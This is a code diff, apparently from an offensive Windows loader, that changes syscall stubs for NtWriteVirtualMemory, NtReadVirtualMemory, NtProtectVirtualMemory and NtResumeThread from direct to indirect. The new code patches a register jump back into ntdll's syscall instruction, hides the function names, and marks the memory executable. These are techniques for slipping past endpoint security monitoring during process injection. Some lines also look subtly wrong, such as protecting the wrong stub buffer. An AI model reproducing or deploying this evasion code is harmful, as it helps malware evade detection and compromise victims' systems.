@@ -12,18 +12,20 @@
 using namespace std;
 
 int const SYSCALL_STUB_SIZE = 21;
+int const INDIRECT_SYSCALL_STUB_SIZE = 31;
+
 
 MyNtWriteVirtualMemory _NtWriteVirtualMemory = NULL;
-char WVMStub[SYSCALL_STUB_SIZE] = {};
+char WVMStub[INDIRECT_SYSCALL_STUB_SIZE] = {};
 
 MyNtReadVirtualMemory _NtReadVirtualMemory = NULL;
-char RVMStub[SYSCALL_STUB_SIZE] = {};
+char RVMStub[INDIRECT_SYSCALL_STUB_SIZE] = {};
 
 MyNtProtectVirtualMemory _NtProtectVirtualMemory = NULL;
-char ProtectStub[SYSCALL_STUB_SIZE] = {};
+char ProtectStub[INDIRECT_SYSCALL_STUB_SIZE] = {};
 
 MyNtResumeThread _NtResumeThread = NULL;
-char ResumeThreadStub[SYSCALL_STUB_SIZE];
+char ResumeThreadStub[INDIRECT_SYSCALL_STUB_SIZE];
 
 PVOID RVAtoRawOffset(DWORD_PTR RVA, PIMAGE_SECTION_HEADER section)
 {
@@ -42,7 +44,21 @@ BOOL MapSyscall(LPCSTR functionName, PIMAGE_EXPORT_DIRECTORY exportDirectory, LP
 		LPCSTR functionNameResolved = (LPCSTR)functionNameVA;
 		if (strcmp(functionNameResolved, functionName) == 0)
 		{
-			memcpy(syscallStub, (LPVOID)functionVA, SYSCALL_STUB_SIZE);
+			char stub[INDIRECT_SYSCALL_STUB_SIZE] = {};
+			memcpy(stub, (LPVOID)functionVA, SYSCALL_STUB_SIZE);
+			LPVOID jmp = (LPVOID)(functionVA + 0x12);
+			std::ostringstream oss;
+			oss << (void*)jmp;
+			std::string s(oss.str());
+			unsigned char jump_le[INDIRECT_SYSCALL_STUB_SIZE - SYSCALL_STUB_SIZE + 3 + 1] = "\x49\xBF\x00\x00\x00\x00\x00\x00\x00\x00\x41\xFF\xE7";
+			int j = 2;
+			for (int i = s.length() - 2; i >= 0; i = i - 2) {
+				int value = std::stoi(s.substr(i, 2), 0, 16);
+				jump_le[j] = value;
+				j++;
+			}
+			memcpy(stub + SYSCALL_STUB_SIZE - 3, (LPVOID)jump_le, INDIRECT_SYSCALL_STUB_SIZE - SYSCALL_STUB_SIZE + 3);
+			memcpy(syscallStub, stub, INDIRECT_SYSCALL_STUB_SIZE);
 			return TRUE;
 		}
 	}
@@ -54,7 +70,7 @@ BOOL FindWriteVirtualMemory(PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID file
 {
 	DWORD oldProtection;
 	_NtWriteVirtualMemory = (MyNtWriteVirtualMemory)(LPVOID)WVMStub;
-	VirtualProtect(WVMStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
+	VirtualProtect(WVMStub, INDIRECT_SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
 
 	if (MapSyscall(AY_OBFUSCATE("NtWriteVirtualMemory"), exportDirectory, fileData, textSection, rdataSection, WVMStub))
 	{
@@ -67,7 +83,7 @@ BOOL FindReadVirtualMemory(PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileD
 {
 	DWORD oldProtection;
 	_NtReadVirtualMemory = (MyNtReadVirtualMemory)(LPVOID)RVMStub;
-	VirtualProtect(WVMStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
+	VirtualProtect(WVMStub, INDIRECT_SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
 
 	if (MapSyscall(AY_OBFUSCATE("NtReadVirtualMemory"), exportDirectory, fileData, textSection, rdataSection, RVMStub))
 	{
@@ -81,7 +97,7 @@ BOOL FindProtectVirtualMemory(PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fi
 
 	DWORD oldProtection;
 	_NtProtectVirtualMemory = (MyNtProtectVirtualMemory)(LPVOID)ProtectStub;
-	VirtualProtect(ProtectStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
+	VirtualProtect(ProtectStub, INDIRECT_SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
 
 	if (MapSyscall(AY_OBFUSCATE("NtProtectVirtualMemory"), exportDirectory, fileData, textSection, rdataSection, ProtectStub))
 	{
@@ -94,7 +110,7 @@ BOOL FindResumeThread(PIMAGE_EXPORT_DIRECTORY exportDirectory, LPVOID fileData, 
 {
 	DWORD oldProtection;
 	_NtResumeThread = (MyNtResumeThread)(LPVOID)ResumeThread;
-	VirtualProtect(ResumeThreadStub, SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
+	VirtualProtect(ResumeThreadStub, INDIRECT_SYSCALL_STUB_SIZE, PAGE_EXECUTE_READWRITE, &oldProtection);
 
 	if (MapSyscall(AY_OBFUSCATE("NtResumeThread"), exportDirectory, fileData, textSection, rdataSection, ResumeThreadStub))
 	{
@@ -135,6 +151,9 @@ BOOL EstablishSyscalls()
 	}
 
 	PIMAGE_EXPORT_DIRECTORY exportDirectory = (PIMAGE_EXPORT_DIRECTORY)RVAtoRawOffset((DWORD_PTR)fileData + exportDirRVA, rdataSection);
+
+	DWORD oldProtection;
+	VirtualProtect(fileData, fileSize, PAGE_EXECUTE_READWRITE, &oldProtection);
 
 	// Assign Syscall values
 	if (!FindWriteVirtualMemory(exportDirectory, fileData, textSection, rdataSection))
